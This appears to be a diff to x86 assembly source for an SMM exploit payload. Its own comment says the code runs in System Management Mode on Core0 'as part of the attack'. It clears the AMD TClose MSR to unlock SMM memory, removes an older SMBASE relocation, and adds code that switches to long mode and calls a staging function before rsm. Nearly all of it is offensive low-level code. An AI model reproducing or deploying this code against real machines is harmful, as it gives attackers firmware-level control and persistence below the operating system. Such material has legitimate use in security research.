@@ -11,13 +11,6 @@
 #define CORE0_INITIAL_STACK		0x1E00
 #define CORE0_PAGE_TABLE_BASE   0x2000
 #define CORE0_NEXT_STAGE        0x1031
-#define CORE0_LONG_MODE	        0x1081 /* 0x1081 */
-
-#define CORE0_LONG_MODE_JMP 	0x1081
-
-#define SMM_BASE_OFFSET_CORE0 	0xafe39000
-
-#define CORE0_NEW_SMM_BASE		0x76000000
 
 
 #define X64_STAGING_FUNC_VA		0xfffff6fb7dbee000
@@ -25,15 +18,13 @@
 
 #define IA32_EFER				0xC0000080
 
-#define CORE1_MUTEX_SIGNAL_ADDR	0x3220
-
 .global _core0_shell
 
 
 .text
-/* This code is executed in SMM by Core0 as part of the attack */
+/* This code is executed in SMM by Core Main as part of the attack */
+.code32
 _core0_shell:
-	.code32
 	/* Clear TClose */
 	movl $0xc0010113,%ecx
 	rdmsr
@@ -64,25 +55,55 @@ next_stage:
 
 ProtFlatMode:
 
-	mov   	$SMM_BASE_OFFSET_CORE0+0xFF00,%ecx
-	mov  	$CORE0_NEW_SMM_BASE,(%ecx)
-	mov  	(%ecx), %ebx
-	mov  	%ebx, (0x800)
+	movl	$CORE0_PAGE_TABLE_BASE,%eax
+    movl    %eax,%cr3 
+    movl    $0x668,%eax                   /* as cr4.PGE is not set here, refresh cr3 8 */
+	movl    %eax,%cr4
 
-	mov   	$SMM_BASE_OFFSET_CORE0+0xFEFC,%ecx
-	mov  	(%ecx), %ecx
-	mov  	%ecx, (0x804)	
+	/* Load TSS 8 */
+    subl    $8,%esp                      /* reserve room in stack 8 */
+    sgdt    (%esp)	
+    movl    2(%esp),%eax              /* eax = GDT base 8 */
+    addl    $8,%esp
+    mov     $0x89,%dl
+    movb    %dl,TSS_SEGMENT+5(%eax)	/* clear busy flag 8 */
+    movl    $TSS_SEGMENT,%eax
+    ltr     %ax
+
+	pushl	$LONG_MODE_CS               /* push cs hardcore here 8 */
+    call    Base                       /* push return address for retf later 8 */
+Base:
+   	addl    $LongMode - Base,(%esp)
+
+	movl 	(%esp),%eax
+
+    movl    $IA32_EFER,%ecx
+    rdmsr
+    or      $1,%ah                      /* enable LME 8 */
+    wrmsr
+    movl    %cr0,%ebx
+    or      $0x80010023,%ebx            /* enable paging + WP + NE + MP + PE 8 */
+    movl	%ebx,%cr0	
+
+    lretl
 	
-	mov   	$SMM_BASE_OFFSET_CORE0+0xFF78,%ecx
-	mov  	(%ecx), %ecx
-	mov  	%ecx, (0x808)
-	mov   	$SMM_BASE_OFFSET_CORE0+0xFF7c,%ecx
-	mov   	$SMM_BASE_OFFSET_CORE0+0xFF7c,%ecx
-	mov  	(%ecx), %ecx
-	mov  	%ecx, (0x80c)
+.code64
+LongMode:
+	movl    $LONG_MODE_DS,%eax
+	movl    %eax,%ds
+	movl    %eax,%es
+	movl    %eax,%fs
+	movl    %eax,%gs
+	movl 	%eax,%ss
 
-	retf
-	/* Return from SMM*/
+	movq 	$X64_STAGING_RSP,%rax
+	addq	$0xF00,%rax
+	movq 	%rax,%rsp
+
+	movq 	$X64_STAGING_FUNC_VA,%rax
+	call 	*%rax	 
+
+	/* Return from SMM 8 */
 	rsm
 
 	nop
